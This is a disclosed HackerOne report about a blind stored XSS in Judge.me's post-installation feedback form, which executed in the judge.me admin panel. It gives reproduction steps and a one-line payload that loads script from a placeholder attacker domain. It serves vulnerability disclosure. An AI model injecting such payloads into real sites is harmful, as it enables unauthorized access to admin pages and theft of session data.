---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1339034'
original_report_id: '1339034'
title: Blind XSS via Feedback form.
weakness: Cross-site Scripting (XSS) - Stored
team_handle: judgeme
created_at: '2021-09-14T02:50:57.623Z'
disclosed_at: '2022-05-03T09:36:36.383Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 54
asset_identifier: judge.me
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Blind XSS via Feedback form.

## Metadata

- HackerOne Report ID: 1339034
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: judgeme
- Disclosed At: 2022-05-03T09:36:36.383Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

Hi Team,

 I found Blind XSS which is triggered on the admin panel. I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload. It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages.

## Steps To Reproduce:

  1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials.** (credentials in the Credentials Header)**
  1. Click the **Apps** tab from the left side and then click **Judge.me Product Reviews**.
  1. Click** Add Widgets** then **Start Installation** and continue.
  1. When the installation is done. It asks **Are you happy with how everything looks?**. Choose  **No, please remove all widgets button**. Feedback form appears and put your blind xss payload.
  1. Wait for payload triggering.

## Supporting Material/References:

Vulnerable Page URL : https://judge.me/admin/████████
Referer: https://judge.me/admin/███

Cookies:```http
██████████████ ```


## Credentials

```http
email:  ██████████@yopmail.com
password: ███████
tempmail: https://yopmail.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

 Admin Page
=====================
█████
Vulnerable Page
=====================
███████ 
Steps to Reproduce Video
=====================
████

## Impact

Blind XSS leads to access the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
